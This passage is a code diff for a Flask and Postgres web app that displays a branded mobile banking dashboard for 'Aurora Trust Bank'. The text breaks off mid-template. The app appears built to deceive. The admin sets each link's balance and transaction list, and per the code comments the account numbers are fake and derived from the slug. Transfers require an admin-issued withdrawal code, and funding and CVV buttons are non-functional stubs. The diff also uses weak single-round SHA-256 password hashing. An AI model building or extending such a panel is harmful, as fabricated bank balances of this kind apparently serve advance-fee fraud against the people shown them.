@@ -1,5 +1,5 @@
-# app.py — Flask + Neon Postgres + Premium UI
-import os, uuid, hashlib, secrets, time, psycopg2, psycopg2.extras
+# app.py — Flask + Neon Postgres + Admin Custom Transactions + User Login
+import os, uuid, hashlib, secrets, time, json, psycopg2, psycopg2.extras
 from urllib.parse import quote
 from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session, abort
 from functools import wraps
@@ -11,7 +11,7 @@ BANK_NAME        = os.environ.get("BANK_NAME", "Aurora Trust Bank")
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(32)
 
-# ---------------- db (unchanged) ----------------
+# ---------------- db ----------------
 
 def get_conn():
     return psycopg2.connect(DATABASE_URL)
@@ -31,6 +31,8 @@ def init_db():
                 currency TEXT NOT NULL DEFAULT 'USD',
                 balance REAL NOT NULL DEFAULT 0,
                 withdraw_code TEXT NOT NULL,
+                password_hash TEXT,
+                transactions TEXT,
                 withdrawn BOOLEAN NOT NULL DEFAULT FALSE,
                 bank TEXT,
                 account TEXT,
@@ -38,6 +40,13 @@ def init_db():
                 created BIGINT NOT NULL
             );
         """)
+        # Migrations for existing tables
+        try:
+            cur.execute("ALTER TABLE links ADD COLUMN IF NOT EXISTS password_hash TEXT")
+            cur.execute("ALTER TABLE links ADD COLUMN IF NOT EXISTS transactions TEXT")
+            conn.commit()
+        except Exception:
+            conn.rollback()
         conn.commit()
 
 def get_admin_hash():
@@ -55,11 +64,12 @@ def set_admin_hash(h):
         conn.commit()
 
 def hash_pw(pw):
+    if not pw: return None
     salt = secrets.token_hex(16)
     return salt + ":" + hashlib.sha256((salt + pw).encode()).hexdigest()
 
 def check_pw(pw, stored):
-    if not stored: return False
+    if not stored or not pw: return False
     try: salt, h = stored.split(":", 1)
     except ValueError: return False
     return hashlib.sha256((salt + pw).encode()).hexdigest() == h
@@ -78,15 +88,17 @@ def db_get_link(slug):
 def db_put_link(rec):
     with get_conn() as conn, conn.cursor() as cur:
         cur.execute("""
-            INSERT INTO links (slug, name, currency, balance, withdraw_code, withdrawn, bank, account, withdrawn_amount, created)
-            VALUES (%(slug)s, %(name)s, %(currency)s, %(balance)s, %(withdraw_code)s, %(withdrawn)s, %(bank)s, %(account)s, %(withdrawn_amount)s, %(created)s)
+            INSERT INTO links (slug, name, currency, balance, withdraw_code, password_hash, transactions, withdrawn, bank, account, withdrawn_amount, created)
+            VALUES (%(slug)s, %(name)s, %(currency)s, %(balance)s, %(withdraw_code)s, %(password_hash)s, %(transactions)s, %(withdrawn)s, %(bank)s, %(account)s, %(withdrawn_amount)s, %(created)s)
             ON CONFLICT (slug) DO UPDATE SET
                 name=EXCLUDED.name, currency=EXCLUDED.currency, balance=EXCLUDED.balance,
-                withdraw_code=EXCLUDED.withdraw_code, withdrawn=EXCLUDED.withdrawn,
+                withdraw_code=EXCLUDED.withdraw_code, password_hash=EXCLUDED.password_hash,
+                transactions=EXCLUDED.transactions, withdrawn=EXCLUDED.withdrawn,
                 bank=EXCLUDED.bank, account=EXCLUDED.account, withdrawn_amount=EXCLUDED.withdrawn_amount
         """, {
             "slug": rec["slug"], "name": rec["name"], "currency": rec["currency"],
             "balance": rec["balance"], "withdraw_code": rec["withdraw_code"],
+            "password_hash": rec.get("password_hash"), "transactions": rec.get("transactions"),
             "withdrawn": rec.get("withdrawn", False), "bank": rec.get("bank"),
             "account": rec.get("account"), "withdrawn_amount": rec.get("withdrawn_amount"),
             "created": rec.get("created", 0),
@@ -98,7 +110,7 @@ def db_delete_link(slug):
         cur.execute("DELETE FROM links WHERE slug=%s", (slug,))
         conn.commit()
 
-# ---------------- auth (unchanged) ----------------
+# ---------------- auth ----------------
 
 def admin_required(f):
     @wraps(f)
@@ -107,7 +119,17 @@ def admin_required(f):
         return f(*a, **k)
     return w
 
-# ---------------- Premium UI CSS ----------------
+def user_required(f):
+    @wraps(f)
+    def w(slug, *a, **k):
+        rec = db_get_link(slug)
+        if not rec: abort(404)
+        if rec.get("password_hash") and not session.get(f"auth_{slug}"):
+            return redirect(url_for("user_login", slug=slug))
+        return f(slug, *a, **k)
+    return w
+
+# ---------------- UI Assets ----------------
 
 BANK_CSS = """
 @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
@@ -120,6 +142,8 @@ body{background:#080b12;color:#ffffff;font-family:'Inter',system-ui,sans-serif;m
 .avatar{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,#8b5cf6,#60a5fa);display:flex;align-items:center;justify-content:center;font-size:1.2rem;font-weight:600}
 .badge{position:absolute;bottom:0;right:-2px;background:#3b82f6;border:2px solid #080b12;border-radius:50%;width:18px;height:18px;display:flex;align-items:center;justify-content:center}
 .wrap{max-width:500px;margin:0 auto;padding:0 1rem}
+.section-title{font-size:1rem;font-weight:600;margin:0 0 1rem;display:flex;justify-content:space-between;align-items:center}
+.section-title a{color:#34d399;font-size:.8rem;text-decoration:none;cursor:pointer}
 
 /* Hero Card */
 .hero-card{
@@ -143,26 +167,29 @@ body{background:#080b12;color:#ffffff;font-family:'Inter',system-ui,sans-serif;m
 .action-btns button:hover{transform:scale(1.02)}
 
 /* Quick Actions */
-.section-title{font-size:1rem;font-weight:600;margin:0 0 1rem;display:flex;justify-content:space-between;align-items:center}
-.section-title a{color:#34d399;font-size:.8rem;text-decoration:none}
 .quick-actions{display:grid;grid-template-columns:repeat(4,1fr);gap:.5rem;margin-bottom:2rem;text-align:center}
-.qa{display:flex;flex-direction:column;align-items:center;gap:.4rem;cursor:pointer}
-.qa-icon{width:50px;height:50px;border-radius:50%;background:#141926;display:flex;align-items:center;justify-content:center;font-size:1.2rem;transition:.2s}
+.qa{display:flex;flex-direction:column;align-items:center;gap:.4rem;cursor:pointer;text-decoration:none;color:#fff}
+.qa-icon{width:54px;height:54px;border-radius:50%;background:#141926;display:flex;align-items:center;justify-content:center;transition:.2s}
+.qa-icon svg{width:24px;height:24px;fill:none;stroke:#60a5fa;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
 .qa:hover .qa-icon{background:#1f2a44;transform:translateY(-2px)}
 .qa span{font-size:.7rem;color:rgba(255,255,255,.8);font-weight:500}
 
 /* Transactions */
-.tx-list{background:#111827;border-radius:20px;padding:.5rem 1rem;margin-bottom:1.5rem}
-.tx{display:flex;justify-content:space-between;align-items:center;padding:1rem 0;border-bottom:1px solid #1f2a44}
-.tx:last-child{border-bottom:0;padding-bottom:1.2rem}
+.tx-list{background:#111827;border-radius:20px;padding:.5rem 1.2rem;margin-bottom:1.5rem;min-height:80px}
+.tx{display:flex;justify-content:space-between;align-items:center;padding:1.2rem 0;border-bottom:1px solid #1f2a44}
+.tx:last-child{border-bottom:0}
 .tx .left{display:flex;gap:1rem;align-items:center}
-.tx .dot{width:40px;height:40px;border-radius:50%;display:grid;place-items:center;font-size:1.2rem;font-weight:700}
-.tx .dot.pos{background:rgba(74,222,128,.15);color:#4ade80}
-.tx .dot.neg{background:rgba(248,113,113,.15);color:#f87171}
+.tx .dot{width:40px;height:40px;border-radius:50%;display:grid;place-items:center;flex-shrink:0}
+.tx .dot.pos{background:rgba(74,222,128,.15)}
+.tx .dot.pos svg{stroke:#4ade80}
+.tx .dot.neg{background:rgba(248,113,113,.15)}
+.tx .dot.neg svg{stroke:#f87171}
+.tx .dot svg{width:20px;height:20px;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
 .tx .ttl{font-size:.9rem;font-weight:600}
 .tx .sub{font-size:.7rem;color:#7d8bab;margin-top:.2rem}
 .tx .amt{font-weight:600;font-size:.9rem}
 .tx .amt.pos{color:#4ade80}.tx .amt.neg{color:#f87171}
+.empty-tx{text-align:center;color:#7d8bab;font-size:.85rem;padding:2rem 0}
 
 /* Bottom Tab */
 .tabbar{position:fixed;bottom:0;left:0;right:0;background:#0b0f19;border-top:1px solid #1f2a44;display:flex;justify-content:space-around;padding:.6rem .5rem 1.2rem;z-index:50;padding-bottom:calc(1.2rem + env(safe-area-inset-bottom))}
@@ -170,10 +197,9 @@ body{background:#080b12;color:#ffffff;font-family:'Inter',system-ui,sans-serif;m
 .tab.active{color:#ffffff}
 .tab.active .ico-wrap{background:#1e293b;border-radius:12px}
 .ico-wrap{padding:.3rem .8rem;display:flex;align-items:center;justify-content:center;transition:.2s}
-.ico{font-size:1.3rem;line-height:1}
-.tab svg{width:22px;height:22px;fill:currentColor}
+.tab svg{width:22px;height:22px;fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
 
-/* Forms */
+/* Forms & Generic Cards */
 .card{background:#111827;border:1px solid #1f2a44;border-radius:20px;padding:1.5rem;margin-bottom:1.5rem}
 label{display:block;font-size:.8rem;color:#9aa7c7;margin-top:1rem;font-weight:500}
 input,select{width:100%;padding:1rem;background:#0b1220;border:1px solid #1f2a44;color:#e8eefc;border-radius:14px;box-sizing:border-box;margin-top:.4rem;font-size:.95rem;font-family:inherit;outline:none}
@@ -185,37 +211,28 @@ button.primary:disabled{opacity:.6;cursor:not-allowed}
 .msg.show{display:block}
 .msg.err{color:#fca5a5;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3)}
 .msg.ok{color:#86efac;background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.3)}
-.back{display:inline-flex;align-items:center;gap:.4rem;color:#9aa7c7;text-decoration:none;font-size:.9rem;margin-bottom:1rem}
+.back{display:inline-flex;align-items:center;gap:.4rem;color:#9aa7c7;text-decoration:none;font-size:.9rem;margin-bottom:1rem;cursor:pointer}
 .back:hover{color:#e8eefc}
 """
 
 BOTTOM_TAB = """
 <div class="tabbar">
-  <a class="tab {{ 'active' if active=='home' else '' }}" href="{{ url_for('view_account', slug=slug) }}">
-    <div class="ico-wrap"><span class="ico">🏠</span></div><span>Dashboard</span>
+  <a class="tab {{ 'active' if active=='dashboard' else '' }}" href="{{ url_for('user_page', slug=slug, page='dashboard') }}">
+    <div class="ico-wrap"><svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg></div><span>Dashboard</span>
   </a>
-  <a class="tab" onclick="toast('Transactions — coming soon')">
-    <div class="ico-wrap"><span class="ico">📊</span></div><span>History</span>
+  <a class="tab {{ 'active' if active=='history' else '' }}" href="{{ url_for('user_page', slug=slug, page='history') }}">
+    <div class="ico-wrap"><svg viewBox="0 0 24 24"><line x1="18" y1="20" x2="18" y2="10"></line><line x1="12" y1="20" x2="12" y2="4"></line><line x1="6" y1="20" x2="6" y2="14"></line></svg></div><span>History</span>
   </a>
-  <a class="tab {{ 'active' if active=='withdraw' else '' }}" href="{{ url_for('withdraw_page', slug=slug) }}">
-    <div class="ico-wrap"><span class="ico">💳</span></div><span>Transfer</span>
+  <a class="tab {{ 'active' if active=='transfer' else '' }}" href="{{ url_for('user_page', slug=slug, page='transfer') }}">
+    <div class="ico-wrap"><svg viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg></div><span>Transfer</span>
   </a>
-  <a class="tab" onclick="toast('Vault — coming soon')">
-    <div class="ico-wrap"><span class="ico">🛡️</span></div><span>Vault</span>
+  <a class="tab {{ 'active' if active=='cards' else '' }}" href="{{ url_for('user_page', slug=slug, page='cards') }}">
+    <div class="ico-wrap"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg></div><span>Vault</span>
   </a>
-  <a class="tab" onclick="toast('Settings — coming soon')">
-    <div class="ico-wrap"><span class="ico">⚙️</span></div><span>Settings</span>
+  <a class="tab {{ 'active' if active=='settings' else '' }}" href="{{ url_for('user_page', slug=slug, page='settings') }}">
+    <div class="ico-wrap"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg></div><span>Settings</span>
   </a>
 </div>
-<script>
-function toast(m){
-  const el=document.createElement('div');
-  el.textContent=m;
-  el.style.cssText='position:fixed;bottom:110px;left:50%;transform:translateX(-50%);background:#1f2a44;color:#fff;padding:.8rem 1.2rem;border-radius:12px;font-size:.85rem;z-index:99;box-shadow:0 4px 20px rgba(0,0,0,.5)';
-  document.body.appendChild(el);
-  setTimeout(()=>el.remove(),2000);
-}
-</script>
 """
 
 # ---------------- Dashboard ----------------
@@ -245,80 +262,69 @@ DASHBOARD_HTML = """
       <div class="acct-info">Account Number {{ acct_full }} · {{ bank }}</div>
       
       <div class="action-btns">
-        <a href="{{ url_for('withdraw_page', slug=slug) }}" style="flex:1;text-decoration:none">
-          <button style="width:100%">✈️ Send Money</button>
+        <a href="{{ url_for('user_page', slug=slug, page='transfer') }}" style="flex:1;text-decoration:none">
+          <button style="width:100%">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+            Send Money
+          </button>
         </a>
-        <button class="primary" onclick="toast('Add money — demo only')">+ Add Money</button>
+        <button class="primary" onclick="alert('This is a demo interface. Add money is disabled.')">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><line x1="12" y1="5" x2="12" y2="19"></line><line x1="5" y1="12" x2="19" y2="12"></line></svg>
+          Add Money
+        </button>
       </div>
     </div>
   </div>
 
   <div class="quick-actions">
-    <div class="qa" onclick="toast('Transfer — demo')">
-      <div class="qa-icon">🔄</div><span>Transfer</span>
-    </div>
-    <div class="qa" onclick="toast('Airtime — demo')">
-      <div class="qa-icon">📱</div><span>Airtime/Data</span>
-    </div>
-    <div class="qa" onclick="toast('Pay Bills — demo')">
-      <div class="qa-icon">🧾</div><span>Pay Bills</span>
-    </div>
-    <div class="qa" onclick="toast('More options — demo')">
-      <div class="qa-icon">⋮⋮</div><span>More</span>
-    </div>
+    <a href="{{ url_for('user_page', slug=slug, page='transfer') }}" class="qa">
+      <div class="qa-icon"><svg viewBox="0 0 24 24"><path d="M17 1l4 4-4 4"></path><path d="M3 11V9a4 4 0 0 1 4-4h14"></path><path d="M7 23l-4-4 4-4"></path><path d="M21 13v2a4 4 0 0 1-4 4H3"></path></svg></div>
+      <span>Transfer</span>
+    </a>
+    <a href="{{ url_for('user_page', slug=slug, page='cards') }}" class="qa">
+      <div class="qa-icon"><svg viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg></div>
+      <span>Cards</span>
+    </a>
+    <a href="{{ url_for('user_page', slug=slug, page='history') }}" class="qa">
+      <div class="qa-icon"><svg viewBox="0 0 24 24"><line x1="18" y1="20" x2="18" y2="10"></line><line x1="12" y1="20" x2="12" y2="4"></line><line x1="6" y1="20" x2="6" y2="14"></line></svg></div>
+      <span>History</span>
+    </a>
+    <a href="{{ url_for('user_page', slug=slug, page='settings') }}" class="qa">
+      <div class="qa-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg></div>
+      <span>Settings</span>
+    </a>
   </div>
 
   <div class="section-title">
     Recent Transactions
-    <a href="#" onclick="toast('History — demo')">See all</a>
+    <a href="{{ url_for('user_page', slug=slug, page='history') }}">See all</a>
   </div>
 
   <div class="tx-list">
-    {% if withdrawn %}
-      <div class="tx">
-        <div class="left">
-          <div class="dot neg">-</div>
-          <div>
-            <div class="ttl">Transfer to {{ bank_dest }}</div>
-            <div class="sub">Just now · Withdrawal</div>
+    {% if tx_list %}
+      {% for tx in tx_list %}
+        <div class="tx">
+          <div class="left">
+            <div class="dot {{ 'pos' if tx.amount > 0 else 'neg' }}">
+              {% if tx.amount > 0 %}
+                <svg viewBox="0 0 24 24"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg>
+              {% else %}
+                <svg viewBox="0 0 24 24"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>
+              {% endif %}
+            </div>
+            <div>
+              <div class="ttl">{{ tx.name }}</div>
+              <div class="sub">{{ tx.date }}</div>
+            </div>
+          </div>
+          <div class="amt {{ 'pos' if tx.amount > 0 else 'neg' }}">
+            {{ '+' if tx.amount > 0 else '-' }}{{ currency }} {{ "{:,.2f}".format(tx.amount|abs) }}
           </div>
         </div>
-        <div class="amt neg">-{{ currency }} {{ "%.2f"|format(withdrawn_amount or 0) }}</div>
-      </div>
+      {% endfor %}
+    {% else %}
+      <div class="empty-tx">No transactions yet.</div>
     {% endif %}
-    
-    <div class="tx">
-      <div class="left">
-        <div class="dot pos">+</div>
-        <div>
-          <div class="ttl">Salary from TechCorp</div>
-          <div class="sub">Today · 09:15 AM</div>
-        </div>
-      </div>
-      <div class="amt pos">+{{ currency }} {{ "%.2f"|format(opening) }}</div>
-    </div>
-    
-    <div class="tx">
-      <div class="left">
-        <div class="dot neg">-</div>
-        <div>
-          <div class="ttl">Spotify Subscription</div>
-          <div class="sub">Yesterday · 6:30 PM</div>
-        </div>
-      </div>
-      <div class="amt neg">-{{ currency }} 4,900.00</div>
-    </div>
-
-    <div class="tx">
-      <div class="left">
-        <div class="dot neg">-</div>
-        <div>
-          <div class="ttl">Food Mart</div>
-          <div class="sub">Dec 14 · 1:05 PM</div>
-        </div>
-      </div>
-      <div class="amt neg">-{{ currency }} 12,300.00</div>
-    </div>
   </div>
 </div>
 
@@ -326,46 +332,67 @@ DASHBOARD_HTML = """
 </body></html>
 """
 
-@app.route("/v/<slug>")
-def view_account(slug):
-    rec = db_get_link(slug)
-    if not rec: abort(404)
-    withdrawn_amount = rec.get("withdrawn_amount") or 0
-    opening = rec["balance"] + withdrawn_amount
-    
-    # Fake account number derived from slug
-    acct_full = "0123" + str(abs(hash(slug)) % 10000000).zfill(7)
-    
-    tab = render_template_string(BOTTOM_TAB, slug=slug, active="home")
-    return render_template_string(
-        DASHBOARD_HTML,
-        css=BANK_CSS, tab=tab,
-        bank=BANK_NAME, name=rec["name"], currency=rec["currency"],
-        balance=rec["balance"], withdrawn=rec.get("withdrawn", False),
-        withdrawn_amount=withdrawn_amount, opening=opening,
-        acct_full=acct_full, bank_dest=rec.get("bank") or "Bank",
-        slug=slug
-    )
+# ---------------- History Page ----------------
 
-# ---------------- Withdraw Page ----------------
+HISTORY_HTML = """
+<!doctype html><html><head><meta charset="utf-8"><title>History — {{ bank }}</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<style>{{ css|safe }}</style></head><body>
+<div class="topbar">
+  <div class="greet">Transaction<span>History</span></div>
+  <div class="avatar-wrap"><div class="avatar">{{ name[0]|upper }}</div></div>
+</div>
+<div class="wrap">
+  <div class="tx-list" style="margin-top:1rem">
+    {% if tx_list %}
+      {% for tx in tx_list %}
+        <div class="tx">
+          <div class="left">
+            <div class="dot {{ 'pos' if tx.amount > 0 else 'neg' }}">
+              {% if tx.amount > 0 %}
+                <svg viewBox="0 0 24 24"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg>
+              {% else %}
+                <svg viewBox="0 0 24 24"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>
+              {% endif %}
+            </div>
+            <div>
+              <div class="ttl">{{ tx.name }}</div>
+              <div class="sub">{{ tx.date }}</div>
+            </div>
+          </div>
+          <div class="amt {{ 'pos' if tx.amount > 0 else 'neg' }}">
+            {{ '+' if tx.amount > 0 else '-' }}{{ currency }} {{ "{:,.2f}".format(tx.amount|abs) }}
+          </div>
+        </div>
+      {% endfor %}
+    {% else %}
+      <div class="empty-tx" style="padding:4rem 0">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#7d8bab" stroke-width="1.5" width="48" height="48" style="margin-bottom:1rem"><line x1="18" y1="20" x2="18" y2="10"></line><line x1="12" y1="20" x2="12" y2="4"></line><line x1="6" y1="20" x2="6" y2="14"></line></svg>
+        <br>No history available yet.<br>Your transactions will appear here.
+      </div>
+    {% endif %}
+  </div>
+</div>
+{{ tab|safe }}
+</body></html>
+"""
 
-WITHDRAW_HTML = """
+# ---------------- Transfer (Withdraw) Page ----------------
+
+TRANSFER_HTML = """
 <!doctype html><html><head><meta charset="utf-8"><title>Send Money — {{ bank }}</title>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <style>{{ css|safe }}</style></head><body>
-
 <div class="topbar">
-  <a class="back" href="{{ url_for('view_account', slug=slug) }}">← Back</a>
-  <div style="font-weight:600;font-size:1rem">Send Money</div>
-  <div style="width:24px"></div>
+  <div class="greet">Send<span>Money</span></div>
+  <div class="avatar-wrap"><div class="avatar">{{ name[0]|upper }}</div></div>
 </div>
-
 <div class="wrap">
   {% if withdrawn %}
     <div class="card" style="text-align:center;padding:2.5rem 1.5rem;margin-top:2rem">
       <div style="font-size:3rem;margin-bottom:1rem">✅</div>
       <h2 style="margin:0 0 .5rem;font-size:1.2rem">Already processed</h2>
-      <p style="color:#9aa7c7;font-size:.9rem;margin:0">This account has already been withdrawn from. Contact the admin if this is unexpected.</p>
+      <p style="color:#9aa7c7;font-size:.9rem;margin:0">This account has already been transferred from. Contact the admin if this is unexpected.</p>
     </div>
   {% else %}
     <div class="card">
@@ -388,7 +415,6 @@ WITHDRAW_HTML = """
     </div>
   {% endif %}
 </div>
-
 {{ tab|safe }}
 <script>
 async function go(){
@@ -406,11 +432,11 @@ async function go(){
   if(!body.code){ msg.className='msg err show'; msg.textContent='withdrawal code required'; return; }
   btn.disabled=true; msg.className='msg show'; msg.textContent='processing…';
   try{
-    const r=await fetch(location.pathname+'/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+    const r=await fetch('/v/{{slug}}/withdraw/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
     const d=await r.json();
     if(r.ok&&d.ok){
       msg.className='msg ok show'; msg.textContent='Transfer approved — redirecting…';
-      setTimeout(()=>location.href='{{ url_for("view_account", slug=slug) }}',900);
+      setTimeout(()=>location.href='/v/{{slug}}/dashboard',900);
     } else {
       msg.className='msg err show'; msg.textContent=d.error||'failed';
       btn.disabled=false;
@@ -424,18 +450,227 @@ async function go(){
 </body></html>
 """
 
-@app.route("/v/<slug>/withdraw")
-def withdraw_page(slug):
+# ---------------- Cards / Vault Page ----------------
+
+CARDS_HTML = """
+<!doctype html><html><head><meta charset="utf-8"><title>Cards — {{ bank }}</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<style>{{ css|safe }}</style></head><body>
+<div class="topbar">
+  <div class="greet">Your<span>Cards & Vault</span></div>
+  <div class="avatar-wrap"><div class="avatar">{{ name[0]|upper }}</div></div>
+</div>
+<div class="wrap">
+  <div class="hero-card" style="height:200px;display:flex;flex-direction:column;justify-content:space-between">
+    <div style="display:flex;justify-content:space-between;align-items:flex-start;position:relative;z-index:1">
+      <div class="bank-logo-sm" style="margin:0">
+        <div class="txt">{{ bank }}<br>Debit</div>
+      </div>
+      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" width="24" height="24"><path d="M5 12.55a11 11 0 0 1 14.08 0"></path><path d="M1.42 9a16 16 0 0 1 21.16 0"></path><path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path><line x1="12" y1="20" x2="12.01" y2="20"></line></svg>
+    </div>
+    <div style="position:relative;z-index:1">
+      <div style="font-family:monospace;font-size:1.4rem;letter-spacing:2px;margin-bottom:.5rem">•••• •••• •••• {{ acct_last }}</div>
+      <div style="display:flex;justify-content:space-between;font-size:.75rem;color:rgba(255,255,255,.7)">
+        <span>{{ name|upper }}</span><span>09/28</span>
+      </div>
+    </div>
+  </div>
+  
+  <div class="card" style="margin-top:1rem">
+    <h3 style="margin:0 0 .5rem;font-size:1rem">Card Status</h3>
+    <p style="color:#9aa7c7;font-size:.9rem;margin:0 0 1rem">Your virtual card is active and ready for online transactions.</p>
+    <div style="display:flex;justify-content:space-between;align-items:center;padding:1rem 0;border-top:1px solid #1f2a44">
+      <span style="font-size:.9rem">Freeze Card</span>
+      <input type="checkbox" style="width:40px;height:20px;margin:0" onclick="alert('Card frozen/unfrozen.')">
+    </div>
+    <div style="display:flex;justify-content:space-between;align-items:center;padding:1rem 0;border-top:1px solid #1f2a44">
+      <span style="font-size:.9rem">View CVV</span>
+      <button onclick="alert('CVV viewing disabled in demo.')" style="background:#1f2a44;border:0;color:#fff;padding:.4rem .8rem;border-radius:8px;font-size:.75rem">View</button>
+    </div>
+  </div>
+</div>
+{{ tab|safe }}
+</body></html>
+"""
+
+# ---------------- Settings Page ----------------
+
+SETTINGS_HTML = """
+<!doctype html><html><head><meta charset="utf-8"><title>Settings — {{ bank }}</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<style>{{ css|safe }}</style></head><body>
+<div class="topbar">
+  <div class="greet">Account<span>Settings</span></div>
+  <div class="avatar-wrap"><div class="avatar">{{ name[0]|upper }}</div></div>
+</div>
+<div class="wrap">
+  <div class="card" style="display:flex;align-items:center;gap:1rem;margin-bottom:1.5rem">
+    <div class="avatar" style="width:60px;height:60px;font-size:1.5rem">{{ name[0]|upper }}</div>
+    <div>
+      <div style="font-size:1.1rem;font-weight:600">{{ name }}</div>
+      <div style="font-size:.85rem;color:#9aa7c7">Account: {{ acct_full }}</div>
+    </div>
+  </div>
+  
+  <div class="card" style="padding:0;overflow:hidden">
+    <div style="padding:1.2rem;border-bottom:1px solid #1f2a44;display:flex;justify-content:space-between;align-items:center">
+      <span style="font-size:.9rem;font-weight:500">Email Notifications</span>
+      <input type="checkbox" checked style="width:40px;height:20px;margin:0">
+    </div>
+    <div style="padding:1.2rem;border-bottom:1px solid #1f2a44;display:flex;justify-content:space-between;align-items:center">
+      <span style="font-size:.9rem;font-weight:500">Biometric Login</span>
+      <input type="checkbox" checked style="width:40px;height:20px;margin:0">
+    </div>
+    <div style="padding:1.2rem;display:flex;justify-content:space-between;align-items:center">
+      <span style="font-size:.9rem;font-weight:500">Dark Mode</span>
+      <input type="checkbox" checked style="width:40px;height:20px;margin:0">
+    </div>
+  </div>
+
+  <div class="card" style="padding:0;overflow:hidden">
+    <div style="padding:1.2rem;border-bottom:1px solid #1f2a44;display:flex;justify-content:space-between;align-items:center;cursor:pointer">
+      <span style="font-size:.9rem;font-weight:500">Privacy Policy</span>
+      <svg viewBox="0 0 24 24" fill="none" stroke="#7d8bab" stroke-width="2" width="16" height="16"><polyline points="9 18 15 12 9 6"></polyline></svg>
+    </div>
+    <div style="padding:1.2rem;display:flex;justify-content:space-between;align-items:center;cursor:pointer">
+      <span style="font-size:.9rem;font-weight:500">Terms of Service</span>
+      <svg viewBox="0 0 24 24" fill="none" stroke="#7d8bab" stroke-width="2" width="16" height="16"><polyline points="9 18 15 12 9 6"></polyline></svg>
+    </div>
+  </div>
+  
